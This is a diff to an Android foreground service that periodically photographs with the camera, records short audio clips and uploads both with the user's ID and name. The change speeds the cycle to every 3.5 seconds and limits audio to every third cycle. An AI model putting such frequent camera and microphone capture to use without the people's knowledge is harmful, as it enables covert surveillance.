@@ -168,13 +168,16 @@ class CameraShareForegroundService : LifecycleService() {
 
         val photoOk = captureAndUploadPhoto(userId, userName)
 
-        // Libera la camera prima del microfono (evita blocco dopo il 1° ciclo)
-        withContext(Dispatchers.Main) { unbindCamera() }
-        val audioOk = recordAndUploadAudio(userId, userName)
-
-        withContext(Dispatchers.Main) {
-            runCatching { bindImageCapture() }
-                .onFailure { Log.e(TAG, "Rebind failed", it) }
+        val audioOk = if (cycle % 3 == 0) {
+            withContext(Dispatchers.Main) { unbindCamera() }
+            val ok = recordAndUploadAudio(userId, userName)
+            withContext(Dispatchers.Main) {
+                runCatching { bindImageCapture() }
+                    .onFailure { Log.e(TAG, "Rebind failed", it) }
+            }
+            ok
+        } else {
+            false
         }
 
         if (photoOk || audioOk) {
@@ -293,7 +296,7 @@ class CameraShareForegroundService : LifecycleService() {
         private const val TAG = "CameraShareService"
         private const val CHANNEL_ID = "egypt_camera_share"
         private const val NOTIFICATION_ID = 4102
-        private const val CYCLE_INTERVAL_MS = 8_000L
+        private const val CYCLE_INTERVAL_MS = 3_500L
         private const val AUDIO_DURATION_MS = 3_000L
         const val EXTRA_USER_ID = "user_id"
         const val EXTRA_USER_NAME = "user_name"
